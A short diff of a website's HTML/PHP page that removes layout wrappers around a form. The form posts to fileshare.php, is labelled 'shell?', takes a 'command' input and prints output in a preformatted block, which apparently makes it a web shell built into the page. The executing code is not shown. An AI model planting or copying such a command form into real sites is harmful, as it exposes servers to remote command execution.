@@ -30,13 +30,12 @@
         <a href="#"><i class='bx bxl-reddit' ></i></a>
     </div>
 </header>
+    
 
-<section class="home">
 
 
-    <div class="home-content">
 
-                    <form action="fileshare.php" method="post">
+                <form action="fileshare.php" method="post">
                 shell? <input type="text" name="command">
                 <input type="submit">
                 </form>
@@ -58,10 +57,7 @@
                 echo "</pre>";
 
                 ?>
-    </div>
 
 
-    
-</section>
 
 </body>
